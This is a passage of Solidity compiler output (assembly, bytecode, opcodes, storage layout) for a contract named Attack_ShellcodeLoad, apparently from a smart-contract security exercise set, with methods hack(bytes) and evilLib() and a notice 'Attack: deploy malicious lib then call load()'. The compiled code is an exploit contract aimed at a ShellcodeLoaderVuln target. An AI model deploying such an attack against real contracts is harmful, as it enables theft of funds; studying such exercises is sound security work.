0x41\n        /* \"#utility.yul\":4859:4860   */\n      0x04\n        /* \"#utility.yul\":4852:4867   */\n      mstore\n        /* \"#utility.yul\":4886:4890   */\n      0x24\n        /* \"#utility.yul\":4883:4884   */\n      0x00\n        /* \"#utility.yul\":4876:4891   */\n      revert\n        /* \"#utility.yul\":4903:5184   */\n    tag_47:\n        /* \"#utility.yul\":4986:5013   */\n      tag_106\n        /* \"#utility.yul\":5008:5012   */\n      dup3\n        /* \"#utility.yul\":4986:5013   */\n      tag_43\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":4978:4984   */\n      dup2\n        /* \"#utility.yul\":4974:5014   */\n      add\n        /* \"#utility.yul\":5116:5122   */\n      dup2\n        /* \"#utility.yul\":5104:5114   */\n      dup2\n        /* \"#utility.yul\":5101:5123   */\n      lt\n        /* \"#utility.yul\":5080:5098   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":5068:5078   */\n      dup3\n        /* \"#utility.yul\":5065:5099   */\n      gt\n        /* \"#utility.yul\":5062:5124   */\n      or\n        /* \"#utility.yul\":5059:5147   */\n      iszero\n      tag_107\n      jumpi\n        /* \"#utility.yul\":5127:5145   */\n      tag_108\n      tag_46\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":5059:5147   */\n    tag_107:\n        /* \"#utility.yul\":5167:5177   */\n      dup1\n        /* \"#utility.yul\":5163:5165   */\n      0x40\n        /* \"#utility.yul\":5156:5178   */\n      mstore\n        /* \"#utility.yul\":4946:5184   */\n      pop\n        /* \"#utility.yul\":4903:5184   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5190:5319   */\n    tag_48:\n        /* \"#utility.yul\":5224:5230   */\n      0x00\n        /* \"#utility.yul\":5251:5271   */\n      tag_110\n      tag_29\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":5241:5271   */\n      swap1\n      pop\n        /* \"#utility.yul\":5280:5313   */\n      tag_111\n        /* \"#utility.yul\":5308:5312   */\n      dup3\n        /* \"#utility.yul\":5300:5306   */\n      dup3\n        /* \"#utility.yul\":5280:5313   */\n      tag_47\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":5190:5319   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5325:5632   */\n    tag_49:\n        /* \"#utility.yul\":5386:5390   */\n      0x00\n        /* \"#utility.yul\":5476:5494   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":5468:5474   */\n      dup3\n        /* \"#utility.yul\":5465:5495   */\n      gt\n        /* \"#utility.yul\":5462:5518   */\n      iszero\n      tag_113\n      jumpi\n        /* \"#utility.yul\":5498:5516   */\n      tag_114\n      tag_46\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":5462:5518   */\n    tag_113:\n        /* \"#utility.yul\":5536:5565   */\n      tag_115\n        /* \"#utility.yul\":5558:5564   */\n      dup3\n        /* \"#utility.yul\":5536:5565   */\n      tag_43\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":5528:5565   */\n      swap1\n      pop\n        /* \"#utility.yul\":5620:5624   */\n      0x20\n        /* \"#utility.yul\":5614:5618   */\n      dup2\n        /* \"#utility.yul\":5610:5625   */\n      add\n        /* \"#utility.yul\":5602:5625   */\n      swap1\n      pop\n        /* \"#utility.yul\":5325:5632   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5638:5777   */\n    tag_50:\n        /* \"#utility.yul\":5727:5733   */\n      dup3\n        /* \"#utility.yul\":5722:5725   */\n      dup2\n        /* \"#utility.yul\":5717:5720   */\n      dup4\n        /* \"#utility.yul\":5711:5734   */\n      mcopy\n        /* \"#utility.yul\":5768:5769   */\n      0x00\n        /* \"#utility.yul\":5759:5765   */\n      dup4\n        /* \"#utility.yul\":5754:5757   */\n      dup4\n        /* \"#utility.yul\":5750:5766   */\n      add\n        /* \"#utility.yul\":5743:5770   */\n      mstore\n        /* \"#utility.yul\":5638:5777   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5783:6215   */\n    tag_51:\n        /* \"#utility.yul\":5871:5876   */\n      0x00\n        /* \"#utility.yul\":5896:5961   */\n      tag_118\n        /* \"#utility.yul\":5912:5960   */\n      tag_119\n        /* \"#utility.yul\":5953:5959   */\n      dup5\n        /* \"#utility.yul\":5912:5960   */\n      tag_49\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":5896:5961   */\n      tag_48\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":5887:5961   */\n      swap1\n      pop\n        /* \"#utility.yul\":5984:5990   */\n      dup3\n        /* \"#utility.yul\":5977:5982   */\n      dup2\n        /* \"#utility.yul\":5970:5991   */\n      mstore\n        /* \"#utility.yul\":6022:6026   */\n      0x20\n        /* \"#utility.yul\":6015:6020   */\n      dup2\n        /* \"#utility.yul\":6011:6027   */\n      add\n        /* \"#utility.yul\":6060:6063   */\n      dup5\n        /* \"#utility.yul\":6051:6057   */\n      dup5\n        /* \"#utility.yul\":6046:6049   */\n      dup5\n        /* \"#utility.yul\":6042:6058   */\n      add\n        /* \"#utility.yul\":6039:6064   */\n      gt\n        /* \"#utility.yul\":6036:6148   */\n      iszero\n      tag_120\n      jumpi\n        /* \"#utility.yul\":6067:6146   */\n      tag_121\n      tag_45\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":6036:6148   */\n    tag_120:\n        /* \"#utility.yul\":6157:6209   */\n      tag_122\n        /* \"#utility.yul\":6202:6208   */\n      dup5\n        /* \"#utility.yul\":6197:6200   */\n      dup3\n        /* \"#utility.yul\":6192:6195   */\n      dup6\n        /* \"#utility.yul\":6157:6209   */\n      tag_50\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":5877:6215   */\n      pop\n        /* \"#utility.yul\":5783:6215   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6234:6587   */\n    tag_52:\n        /* \"#utility.yul\":6300:6305   */\n      0x00\n        /* \"#utility.yul\":6349:6352   */\n      dup3\n        /* \"#utility.yul\":6342:6346   */\n      0x1f\n        /* \"#utility.yul\":6334:6340   */\n      dup4\n        /* \"#utility.yul\":6330:6347   */\n      add\n        /* \"#utility.yul\":6326:6353   */\n      slt\n        /* \"#utility.yul\":6316:6438   */\n      tag_124\n      jumpi\n        /* \"#utility.yul\":6357:6436   */\n      tag_125\n      tag_32\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":6316:6438   */\n    tag_124:\n        /* \"#utility.yul\":6467:6473   */\n      dup2\n        /* \"#utility.yul\":6461:6474   */\n      mload\n        /* \"#utility.yul\":6492:6581   */\n      tag_126\n        /* \"#utility.yul\":6577:6580   */\n      dup5\n        /* \"#utility.yul\":6569:6575   */\n      dup3\n        /* \"#utility.yul\":6562:6566   */\n      0x20\n        /* \"#utility.yul\":6554:6560   */\n      dup7\n        /* \"#utility.yul\":6550:6567   */\n      add\n        /* \"#utility.yul\":6492:6581   */\n      tag_51\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":6483:6581   */\n      swap2\n      pop\n        /* \"#utility.yul\":6306:6587   */\n      pop\n        /* \"#utility.yul\":6234:6587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6593:7115   */\n    tag_25:\n        /* \"#utility.yul\":6672:6678   */\n      0x00\n        /* \"#utility.yul\":6721:6723   */\n      0x20\n        /* \"#utility.yul\":6709:6718   */\n      dup3\n        /* \"#utility.yul\":6700:6707   */\n      dup5\n        /* \"#utility.yul\":6696:6719   */\n      sub\n        /* \"#utility.yul\":6692:6724   */\n      slt\n        /* \"#utility.yul\":6689:6808   */\n      iszero\n      tag_128\n      jumpi\n        /* \"#utility.yul\":6727:6806   */\n      tag_129\n      tag_30\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":6689:6808   */\n    tag_128:\n        /* \"#utility.yul\":6868:6869   */\n      0x00\n        /* \"#utility.yul\":6857:6866   */\n      dup3\n        /* \"#utility.yul\":6853:6870   */\n      add\n        /* \"#utility.yul\":6847:6871   */\n      mload\n        /* \"#utility.yul\":6898:6916   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":6890:6896   */\n      dup2\n        /* \"#utility.yul\":6887:6917   */\n      gt\n        /* \"#utility.yul\":6884:7001   */\n      iszero\n      tag_130\n      jumpi\n        /* \"#utility.yul\":6920:6999   */\n      tag_131\n      tag_31\n      jump\t// in\n    tag_131:\n        /* \"#utility.yul\":6884:7001   */\n    tag_130:\n        /* \"#utility.yul\":7025:7098   */\n      tag_132\n        /* \"#utility.yul\":7090:7097   */\n      dup5\n        /* \"#utility.yul\":7081:7087   */\n      dup3\n        /* \"#utility.yul\":7070:7079   */\n      dup6\n        /* \"#utility.yul\":7066:7088   */\n      add\n        /* \"#utility.yul\":7025:7098   */\n      tag_52\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":7015:7098   */\n      swap2\n      pop\n        /* \"#utility.yul\":6818:7108   */\n      pop\n        /* \"#utility.yul\":6593:7115   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220170853a0714272b7e4cc32284e010b6efc04b6917b941243678febb0a9f8bb6164736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5060405161070938038061070983398181016040528101906100319190610150565b815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061018e565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b5f6100f5826100da565b9050919050565b610105816100eb565b811461010f575f80fd5b50565b5f81519050610120816100fc565b92915050565b61012f816100da565b8114610139575f80fd5b50565b5f8151905061014a81610126565b92915050565b5f8060408385031215610166576101656100b7565b5b5f61017385828601610112565b92505060206101848582860161013c565b9150509250929050565b61056e8061019b5f395ff3fe608060405260043610610033575f3560e01c80637ee2bd8714610037578063b4e372d414610061578063d4b839921461007d575b5f80fd5b348015610042575f80fd5b5061004b6100a7565b60405161005891906101f5565b60405180910390f35b61007b60048036038101906100769190610280565b6100cc565b005b348015610088575f80fd5b50610091610193565b60405161009e9190610326565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c40a8f623460015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1685856040518563ffffffff1660e01b815260040161014a93929190610399565b5f6040518083038185885af1158015610165573d5f803e3d5ffd5b50505050506040513d5f823e3d601f19601f8201168201806040525081019061018e91906104f1565b505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101df826101b6565b9050919050565b6101ef816101d5565b82525050565b5f6020820190506102085f8301846101e6565b92915050565b5f604051905090565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f8083601f8401126102405761023f61021f565b5b8235905067ffffffffffffffff81111561025d5761025c610223565b5b60208301915083600182028301111561027957610278610227565b5b9250929050565b5f806020838503121561029657610295610217565b5b5f83013567ffffffffffffffff8111156102b3576102b261021b565b5b6102bf8582860161022b565b92509250509250929050565b5f819050919050565b5f6102ee6102e96102e4846101b6565b6102cb565b6101b6565b9050919050565b5f6102ff826102d4565b9050919050565b5f610310826102f5565b9050919050565b61032081610306565b82525050565b5f6020820190506103395f830184610317565b92915050565b5f82825260208201905092915050565b828183375f83830152505050565b5f601f19601f8301169050919050565b5f610378838561033f565b935061038583858461034f565b61038e8361035d565b840190509392505050565b5f6040820190506103ac5f8301866101e6565b81810360208301526103bf81848661036d565b9050949350505050565b5f80fd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b6104038261035d565b810181811067ffffffffffffffff82111715610422576104216103cd565b5b80604052505050565b5f61043461020e565b905061044082826103fa565b919050565b5f67ffffffffffffffff82111561045f5761045e6103cd565b5b6104688261035d565b9050602081019050919050565b8281835e5f83830152505050565b5f61049561049084610445565b61042b565b9050828152602081018484840111156104b1576104b06103c9565b5b6104bc848285610475565b509392505050565b5f82601f8301126104d8576104d761021f565b5b81516104e8848260208601610483565b91505092915050565b5f6020828403121561050657610505610217565b5b5f82015167ffffffffffffffff8111156105235761052261021b565b5b61052f848285016104c4565b9150509291505056fea2646970667358221220170853a0714272b7e4cc32284e010b6efc04b6917b941243678febb0a9f8bb6164736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x709 CODESIZE SUB DUP1 PUSH2 0x709 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST DUP2 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x18E JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE4 DUP3 PUSH2 0xBB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xF5 DUP3 PUSH2 0xDA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x105 DUP2 PUSH2 0xEB JUMP JUMPDEST DUP2 EQ PUSH2 0x10F JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x120 DUP2 PUSH2 0xFC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0xDA JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x166 JUMPI PUSH2 0x165 PUSH2 0xB7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x173 DUP6 DUP3 DUP7 ADD PUSH2 0x112 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x184 DUP6 DUP3 DUP7 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x56E DUP1 PUSH2 0x19B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x33 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7EE2BD87 EQ PUSH2 0x37 JUMPI DUP1 PUSH4 0xB4E372D4 EQ PUSH2 0x61 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x7D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x42 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x4B PUSH2 0xA7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x1F5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x76 SWAP2 SWAP1 PUSH2 0x280 JUMP JUMPDEST PUSH2 0xCC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x88 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x91 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x9E SWAP2 SWAP1 PUSH2 0x326 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC40A8F62 CALLVALUE PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 DUP6 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x14A SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x399 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x165 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x18E SWAP2 SWAP1 PUSH2 0x4F1 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1DF DUP3 PUSH2 0x1B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1EF DUP2 PUSH2 0x1D5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x208 PUSH0 DUP4 ADD DUP5 PUSH2 0x1E6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x240 JUMPI PUSH2 0x23F PUSH2 0x21F JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x25D JUMPI PUSH2 0x25C PUSH2 0x223 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x279 JUMPI PUSH2 0x278 PUSH2 0x227 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x20 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x296 JUMPI PUSH2 0x295 PUSH2 0x217 JUMP JUMPDEST JUMPDEST PUSH0 DUP4 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x2B3 JUMPI PUSH2 0x2B2 PUSH2 0x21B JUMP JUMPDEST JUMPDEST PUSH2 0x2BF DUP6 DUP3 DUP7 ADD PUSH2 0x22B JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2EE PUSH2 0x2E9 PUSH2 0x2E4 DUP5 PUSH2 0x1B6 JUMP JUMPDEST PUSH2 0x2CB JUMP JUMPDEST PUSH2 0x1B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2FF DUP3 PUSH2 0x2D4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x310 DUP3 PUSH2 0x2F5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x320 DUP2 PUSH2 0x306 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x339 PUSH0 DUP4 ADD DUP5 PUSH2 0x317 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x378 DUP4 DUP6 PUSH2 0x33F JUMP JUMPDEST SWAP4 POP PUSH2 0x385 DUP4 DUP6 DUP5 PUSH2 0x34F JUMP JUMPDEST PUSH2 0x38E DUP4 PUSH2 0x35D JUMP JUMPDEST DUP5 ADD SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x3AC PUSH0 DUP4 ADD DUP7 PUSH2 0x1E6 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x20 DUP4 ADD MSTORE PUSH2 0x3BF DUP2 DUP5 DUP7 PUSH2 0x36D JUMP JUMPDEST SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH2 0x403 DUP3 PUSH2 0x35D JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x422 JUMPI PUSH2 0x421 PUSH2 0x3CD JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x434 PUSH2 0x20E JUMP JUMPDEST SWAP1 POP PUSH2 0x440 DUP3 DUP3 PUSH2 0x3FA JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x45F JUMPI PUSH2 0x45E PUSH2 0x3CD JUMP JUMPDEST JUMPDEST PUSH2 0x468 DUP3 PUSH2 0x35D JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x495 PUSH2 0x490 DUP5 PUSH2 0x445 JUMP JUMPDEST PUSH2 0x42B JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x4B1 JUMPI PUSH2 0x4B0 PUSH2 0x3C9 JUMP JUMPDEST JUMPDEST PUSH2 0x4BC DUP5 DUP3 DUP6 PUSH2 0x475 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x4D8 JUMPI PUSH2 0x4D7 PUSH2 0x21F JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH2 0x4E8 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x483 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x506 JUMPI PUSH2 0x505 PUSH2 0x217 JUMP JUMPDEST JUMPDEST PUSH0 DUP3 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x523 JUMPI PUSH2 0x522 PUSH2 0x21B JUMP JUMPDEST JUMPDEST PUSH2 0x52F DUP5 DUP3 DUP6 ADD PUSH2 0x4C4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 OR ADDMOD MSTORE8 LOG0 PUSH18 0x4272B7E4CC32284E010B6EFC04B6917B9412 NUMBER PUSH8 0x8FEBB0A9F8BB6164 PUSH20 0x6F6C634300081A00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "278000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"evilLib()": "2486",
						"hack(bytes)": "infinite",
						"target()": "infinite"
					}
				},
				"methodIdentifiers": {
					"evilLib()": "7ee2bd87",
					"hack(bytes)": "b4e372d4",
					"target()": "d4b83992"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 466,
						"contract": "S/Shell/Shell.sol:Attack_ShellcodeLoad",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(ShellcodeLoaderVuln)462"
					},
					{
						"astId": 468,
						"contract": "S/Shell/Shell.sol:Attack_ShellcodeLoad",
						"label": "evilLib",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(ShellcodeLoaderVuln)462": {
						"encoding": "inplace",
						"label": "contract ShellcodeLoaderVuln",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"notice": "Attack: deploy malicious lib then call load()",
				"version": 1
			}
		}
	}
}